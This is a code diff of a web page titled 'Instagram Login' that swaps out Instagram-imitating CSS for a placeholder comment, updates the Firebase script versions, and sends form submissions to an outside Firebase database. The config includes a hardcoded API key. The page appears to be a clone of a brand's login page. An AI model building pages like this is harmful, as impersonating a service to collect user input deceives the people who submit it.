@@ -5,124 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Instagram Login</title>
     <style>
-      * {
-        margin: 0;
-        padding: 0;
-        box-sizing: border-box;
-      }
-      
-      body {
-        font-family: Arial, sans-serif;
-        background: #fafafa;
-        display: flex;
-        justify-content: center;
-        align-items: center;
-        height: 100vh;
-      }
-      
-      .login-container {
-        display: flex;
-        flex-direction: column;
-        align-items: center;
-        justify-content: center;
-        background: white;
-        width: 100%;
-        max-width: 350px;
-        padding: 20px;
-        border-radius: 10px;
-        box-shadow: 0 1px 3px rgba(0,0,0,0.12), 0 1px 2px rgba(0,0,0,0.24);
-      }
-      
-      .login-form {
-        display: flex;
-        flex-direction: column;
-        align-items: center;
-      }
-      
-      .logo {
-        width: 90px;
-        margin-bottom: 20px;
-      }
-      
-      input {
-        width: 100%;
-        padding: 10px;
-        margin-bottom: 10px;
-        border: 1px solid #dbdbdb;
-        border-radius: 12px;
-        font-size: 14px;
-        color: #262626;
-      }
-      
-      input::placeholder {
-        color: #8e8e8e;
-      }
-      
-      button {
-        width: 100%;
-        padding: 10px;
-        background-color: #0095f6;
-        color: white;
-        border: none;
-        border-radius: 5px;
-        font-size: 14px;
-        cursor: pointer;
-        transition: background-color 0.3s ease;
-      }
-      
-      button:hover {
-        background-color: #007bb5;
-      }
-      
-      .separator {
-        display: flex;
-        justify-content: center;
-        align-items: center;
-        margin: 20px 0;
-        width: 100%;
-      }
-      
-      .separator span {
-        color: #8e8e8e;
-        font-size: 14px;
-      }
-      
-      .facebook-login-btn {
-        width: 100%;
-        padding: 10px;
-        background-color: #385185;
-        color: white;
-        border: none;
-        border-radius: 5px;
-        font-size: 14px;
-        cursor: pointer;
-        transition: background-color 0.3s ease;
-      }
-      
-      .facebook-login-btn:hover {
-        background-color: #2e3e6b;
-      }
-      
-      .forgot-password {
-        color: #0095f6;
-        font-size: 14px;
-        text-decoration: none;
-        margin-top: 10px;
-        text-align: center;
-      }
-      
-      .signup-container {
-        display: flex;
-        justify-content: center;
-        margin-top: 15px;
-        font-size: 14px;
-        color: #8e8e8e;
-      }
-      
-      .signup-container a {
-        color: #0095f6;
-        text-decoration: none;
-      }
+      /* Your existing CSS styles */
     </style>
 </head>
 <body>
@@ -132,23 +15,23 @@
     <textarea name="message" placeholder="Your Message"></textarea>
     <button type="submit">Submit</button>
 </form>
-<script src="https://www.gstatic.com/firebasejs/9.0.0/firebase-app.js"></script>
-<script src="https://www.gstatic.com/firebasejs/9.0.0/firebase-database.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-app.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-database.js"></script>
 <script>
     // Your Firebase config
     const firebaseConfig = {
         apiKey: "AIzaSyBQOhH2t5XPieLGlM3anZYco06-PvQt37c",
-          authDomain: "adpsr-75e1f.firebaseapp.com",
-          databaseURL: "https://adpsr-75e1f-default-rtdb.firebaseio.com",
-          projectId: "adpsr-75e1f",
-          storageBucket: "adpsr-75e1f.firebasestorage.app",
-          messagingSenderId: "959425930437",
-          appId: "1:959425930437:web:cd3bae057e5b657a32fcac",
-          measurementId: "G-1X15K2TPH4"
+        authDomain: "adpsr-75e1f.firebaseapp.com",
+        databaseURL: "https://adpsr-75e1f-default-rtdb.firebaseio.com",
+        projectId: "adpsr-75e1f",
+        storageBucket: "adpsr-75e1f.appspot.com",
+        messagingSenderId: "959425930437",
+        appId: "1:959425930437:web:cd3bae057e5b657a32fcac",
+        measurementId: "G-1X15K2TPH4"
     };
 
     // Initialize Firebase
-    const app = firebase.initializeApp(firebaseConfig);
+    firebase.initializeApp(firebaseConfig);
     const database = firebase.database();
 
     const form = document.getElementById('contactForm');
@@ -159,7 +42,7 @@
         formData.forEach((value, key) => {
             data[key] = value;
         });
-        firebase.database().ref('submissions').push(data)
+        database.ref('submissions').push(data)
             .then(() => alert('Form submitted successfully!'))
             .catch(err => console.error('Error:', err));
     });
